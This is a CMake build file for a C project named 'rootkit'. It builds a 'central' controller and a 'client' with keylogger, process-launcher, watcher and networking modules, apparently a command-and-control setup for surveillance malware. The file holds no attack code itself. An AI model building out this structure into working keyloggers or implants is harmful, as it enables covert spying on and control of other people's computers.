cmake_minimum_required(VERSION 3.10)
project(rootkit C)

set(CMAKE_C_STANDARD 17)

# Central executable
add_executable(central
        central/main.c
        central/menu/menu.c
        utils/utils.c
        networking/protocol.c
        networking/networking.c)

target_compile_definitions(central PRIVATE CENTRAL_BUILD)

target_include_directories(central PRIVATE
        ${CMAKE_SOURCE_DIR}/central/menu
        ${CMAKE_SOURCE_DIR}/utils
        ${CMAKE_SOURCE_DIR}/networking)

find_package(Threads REQUIRED)

add_executable(client
        client/main.c
        client/keylogging/keylogger.c
        client/process_launcher/process_launcher.c
        client/watcher/watcher.c
        utils/utils.c
        networking/networking.c
        networking/protocol.c)

target_compile_definitions(client PRIVATE CLIENT_BUILD)

target_include_directories(client PRIVATE
        ${CMAKE_SOURCE_DIR}/client
        ${CMAKE_SOURCE_DIR}/keylogging
        ${CMAKE_SOURCE_DIR}/networking
        ${CMAKE_SOURCE_DIR}/utils
        ${CMAKE_SOURCE_DIR}/watcher
        ${CMAKE_SOURCE_DIR}/process_launcher)

target_link_libraries(client Threads::Threads)
